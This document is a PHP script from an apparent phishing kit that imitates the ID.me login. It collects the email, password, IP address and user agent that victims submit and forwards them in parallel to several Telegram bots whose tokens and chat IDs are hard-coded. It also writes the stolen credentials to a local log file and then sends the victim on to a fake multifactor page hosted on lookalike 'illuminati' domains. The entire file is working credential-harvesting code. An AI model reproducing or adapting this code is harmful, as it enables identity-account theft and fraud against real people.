<?php
ob_start();

// Site-specific configuration with domain-based bots and redirects
$site_map = [
    '127.0.0.1' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        'redirect' => 'https://illuminatiofficial.world/index.html'
    ],
    
    'illuminatiofficial.world' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        'redirect' => 'https://illuminatiofficial.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
    ],
    
    'illuminatipath.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8491692614:AAHhTPb4DRwkvmJa0SjF00v5x8kNWA82xfk', 'chat_id' => '6378885812'],
        ],
        "redirect" => "https://illuminatipath.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
    ],

    'illuminatisyndicate.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
        ],
        "redirect" => "https://illuminatisyndicate.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
    ],

    'illuminatisacred.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8412410845:AAFxuHUyafETE-8oCvUsSp45l0CtDkb-qm0', 'chat_id' => '7411482040'],
        ],
        "redirect" => "https://illuminatisacred.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
    ],
];

// Get the referring domain
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';

// Find the configuration for this domain
$config = $site_map[$domain] ?? null;

// If no config found, use a default one
if (!$config) {
    $config = reset($site_map);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Setup log file
    $log_file = __DIR__ . "/logs/idme_logins.txt";
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true);
    }

    // Enhanced logging function with microtime
    function log_entry($msg, $level = 'INFO') {
        global $log_file;
        $timestamp = date("Y-m-d H:i:s.u");
        file_put_contents($log_file, "[$timestamp] [$level] $msg\n", FILE_APPEND);
    }

    // Start timing
    $start_time = microtime(true);
    log_entry("=== Login Submission Started ===");

    // Get form data from HTML form
    $useremail = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
    $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
    $remember_me = isset($_POST['remember_me']) ? 'Yes' : 'No';

    // Get IP address SERVER-SIDE
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_X_FORWARDED'] ?? 
          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_FORWARDED'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    
    // Handle multiple IPs
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }

    $timestamp = date("Y-m-d H:i:s");
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    // Prepare Telegram message
    $message = "🔐 *ID.me Login Submission*\n\n" .
               "📧 *Email:* `$useremail`\n" .
               "🔑 *Password:* `$userpassword`\n" .
               "💾 *Remember Me:* $remember_me\n" .
               "🌐 *Domain:* $domain\n" .
               "📡 *IP:* `$ip`\n" .
               "🕒 *Time:* $timestamp\n" .
               "🔍 *User Agent:* " . substr($user_agent, 0, 100);

    // Log the submission immediately
    log_entry("[$domain] Login from $ip - Email: $useremail");

    // ============================================
    // ENHANCED cURL WITH MULTI-HANDLE (PARALLEL)
    // ============================================
    
    $multi_handle = curl_multi_init();
    $handles = [];
    
    foreach ($config['bots'] as $bot_index => $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) {
            log_entry("Skipping bot $bot_index - empty token or chat_id", 'WARN');
            continue;
        }
        
        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        
        $ch = curl_init($url);
        
        // OPTIMIZED cURL settings for speed
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 3,           // 3 seconds MAX per request
            CURLOPT_CONNECTTIMEOUT => 2,    // 2 seconds for connection
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_FORBID_REUSE => true,
            CURLOPT_FRESH_CONNECT => true,
            CURLOPT_NOSIGNAL => 1,          // Better for timeouts
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2TLS,
            CURLOPT_ENCODING => 'gzip',
            CURLOPT_TCP_FASTOPEN => true,
            CURLOPT_TCP_NODELAY => true,
        ]);
        
        curl_multi_add_handle($multi_handle, $ch);
        $handles[$bot_index] = $ch;
    }
    
    // Execute all handles in parallel
    $running = null;
    do {
        $status = curl_multi_exec($multi_handle, $running);
        if ($running) {
            curl_multi_select($multi_handle, 0.01); // 10ms timeout
        }
    } while ($running && $status == CURLM_OK);
    
    // Process results quickly
    $success_count = 0;
    foreach ($handles as $bot_index => $ch) {
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $total_time = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
        
        if ($http_code == 200) {
            $success_count++;
            log_entry("Bot $bot_index delivered in " . round($total_time, 3) . "s", 'SUCCESS');
        } else {
            $error = curl_error($ch);
            log_entry("Bot $bot_index failed - HTTP $http_code: $error", 'ERROR');
        }
        
        curl_multi_remove_handle($multi_handle, $ch);
        curl_close($ch);
    }
    
    curl_multi_close($multi_handle);
    
    $end_time = microtime(true);
    $total_processing = round(($end_time - $start_time) * 1000, 2);
    
    log_entry("Telegram delivery: $success_count/" . count($config['bots']) . " bots | Total time: {$total_processing}ms", 'STATS');
    
    // ============================================
    // IMMEDIATE REDIRECT
    // ============================================
    
    if ($success_count > 0) {
        log_entry("✅ Telegram delivery confirmed before redirect", 'SUCCESS');
    } else {
        log_entry("⚠️ No Telegram bots delivered, but proceeding with redirect", 'WARN');
    }
    
    // Force immediate output and redirect
    if (ob_get_level()) ob_end_clean();
    
    // Performance headers
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    header("Cache-Control: post-check=0, pre-check=0", false);
    header("Pragma: no-cache");
    
    // Immediate redirect
    header("Location: " . $config['redirect']);
    exit;
    
} else {
    // Not a POST request
    header("HTTP/1.1 405 Method Not Allowed");
    echo "This page only accepts POST submissions from the login form.";
    exit;
}
?>
